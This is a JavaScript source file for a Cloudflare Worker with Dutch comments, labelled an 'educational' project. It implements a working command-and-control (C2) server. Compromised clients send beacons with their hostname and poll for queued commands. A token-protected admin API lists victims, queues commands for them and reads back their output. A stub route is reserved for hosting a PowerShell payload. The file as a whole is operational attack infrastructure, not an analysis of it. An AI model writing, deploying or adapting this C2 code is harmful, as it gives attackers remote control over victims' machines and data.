// Cloudflare Worker - C2 Proxy
// Educational Cybersecurity Project

// KV Namespace voor data opslag
// Maak in Cloudflare: Workers > KV > Create namespace > "C2_STORAGE"

const ADMIN_TOKEN = "YOUR_SECRET_TOKEN_HERE"; // Verander dit!

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const path = url.pathname
  
  // CORS headers
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
  }
  
  // Handle OPTIONS preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }
  
  try {
    // Route: Initial payload delivery
    if (path === '/payload' && request.method === 'GET') {
      // Hier zou je de PowerShell payload kunnen hosten
      // Of redirect naar een GitHub raw URL
      return new Response('# Payload would be here', {
        headers: { 'Content-Type': 'text/plain', ...corsHeaders }
      })
    }
    
    // Route: Beacon ontvangen van client
    if (path === '/beacon' && request.method === 'POST') {
      const data = await request.json()
      const clientId = data.hostname || 'unknown'
      
      // Sla beacon data op in KV
      await C2_STORAGE.put(`beacon:${clientId}`, JSON.stringify({
        ...data,
        lastSeen: Date.now()
      }), { expirationTtl: 3600 })
      
      // Log voor debugging
      console.log(`Beacon from ${clientId}:`, data)
      
      return new Response(JSON.stringify({ status: 'ok' }), {
        headers: { 'Content-Type': 'application/json', ...corsHeaders }
      })
    }
    
    // Route: Client pollt voor commands
    if (path === '/command' && request.method === 'GET') {
      const clientId = url.searchParams.get('id') || 'unknown'
      
      // Haal command op voor deze client
      const command = await C2_STORAGE.get(`command:${clientId}`)
      
      if (command) {
        // Command gevonden, stuur en verwijder
        await C2_STORAGE.delete(`command:${clientId}`)
        return new Response(JSON.stringify({ command }), {
          headers: { 'Content-Type': 'application/json', ...corsHeaders }
        })
      }
      
      // Geen command beschikbaar
      return new Response(JSON.stringify({ command: null }), {
        headers: { 'Content-Type': 'application/json', ...corsHeaders }
      })
    }
    
    // Route: Admin - lijst actieve clients
    if (path === '/admin/clients' && request.method === 'GET') {
      const token = request.headers.get('Authorization')
      if (token !== `Bearer ${ADMIN_TOKEN}`) {
        return new Response('Unauthorized', { status: 401 })
      }
      
      // Lijst alle beacons
      const list = await C2_STORAGE.list({ prefix: 'beacon:' })
      const clients = []
      
      for (const key of list.keys) {
        const data = await C2_STORAGE.get(key.name)
        if (data) {
          clients.push(JSON.parse(data))
        }
      }
      
      return new Response(JSON.stringify({ clients }), {
        headers: { 'Content-Type': 'application/json', ...corsHeaders }
      })
    }
    
    // Route: Admin - stuur command naar client
    if (path === '/admin/command' && request.method === 'POST') {
      const token = request.headers.get('Authorization')
      if (token !== `Bearer ${ADMIN_TOKEN}`) {
        return new Response('Unauthorized', { status: 401 })
      }
      
      const { clientId, command } = await request.json()
      
      // Sla command op voor client
      await C2_STORAGE.put(`command:${clientId}`, command, {
        expirationTtl: 300 // 5 minuten expiration
      })
      
      return new Response(JSON.stringify({ 
        status: 'ok',
        message: `Command queued for ${clientId}`
      }), {
        headers: { 'Content-Type': 'application/json', ...corsHeaders }
      })
    }
    
    // Route: Admin - haal outputs op
    if (path === '/admin/output' && request.method === 'GET') {
      const token = request.headers.get('Authorization')
      if (token !== `Bearer ${ADMIN_TOKEN}`) {
        return new Response('Unauthorized', { status: 401 })
      }
      
      const clientId = url.searchParams.get('id')
      const data = await C2_STORAGE.get(`beacon:${clientId}`)
      
      return new Response(data || '{}', {
        headers: { 'Content-Type': 'application/json', ...corsHeaders }
      })
    }
    
    // Default route
    return new Response('C2 Server Active', {
      headers: { ...corsHeaders }
    })
    
  } catch (error) {
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json', ...corsHeaders }
    })
  }
}
